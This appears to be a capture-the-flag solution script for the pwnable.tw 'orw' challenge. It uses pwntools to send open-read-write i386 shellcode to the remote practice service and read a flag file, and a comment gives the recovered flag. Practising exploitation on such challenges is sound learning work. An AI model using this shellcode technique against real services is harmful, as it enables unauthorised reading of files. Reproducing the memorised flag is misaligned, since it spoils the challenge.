# coding = utf-8
# author = Mr.BeanX

from pwn import *
 
p = remote("chall.pwnable.tw", 10001)
shellcode = ""
shellcode += shellcraft.i386.pushstr("/home/orw/flag")   
shellcode += shellcraft.i386.linux.syscall("SYS_open", 'esp') 
shellcode += shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
shellcode += shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
p.recvuntil(":")
p.send(asm(shellcode))
p.interactive()


# FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
